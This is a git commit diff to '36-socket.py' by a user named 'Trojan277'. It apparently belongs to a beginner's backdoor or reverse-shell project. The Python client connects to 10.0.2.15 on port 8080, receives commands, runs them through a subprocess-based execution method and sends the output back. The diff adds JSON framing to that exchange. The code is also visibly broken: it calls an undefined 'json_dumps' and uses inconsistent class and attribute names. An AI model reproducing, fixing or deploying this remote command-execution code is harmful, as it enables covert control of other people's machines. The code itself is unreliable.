59b5a8efcdf24a31773a8ea0802233d7902bd177
Trojan277 <70176627+Trojan277@users.noreply.github.com>
2021-01-23 10:24:55 +0300

    Update 36-socket.py

--- 36-socket.py
+++ 36-socket.py
@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import json
 
 class Socket:
 	def __init__(self, ip, port):
@@ -12,16 +13,30 @@ class Socket:
 
 #Connection.send('Connection Successful\n')
 
+	def json_send(self, data):
+		json_data = json_dumps(data)
+		self.Connection.send(json_data)
+
+
+	def json_receive(self):
+		json_data = ''
+
+		while True:
+			try:
+				json_data = json_data + self.Connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
+
 	def start_socket(self):
 		while True:
 
-			command = self.my_connection.recv(1024)
+			command = self.json_receive()
 			command_output = self.command_execution(command)
 
-			self.Connection.send(command_execution)
+			self.json_send(command_output)
 
 		self.Connection.close()
 
 my_socket_object = MySocket('10.0.2.15', 8080)
-my_socket_object.start_socket
-
+my_socket_object.start_socket()
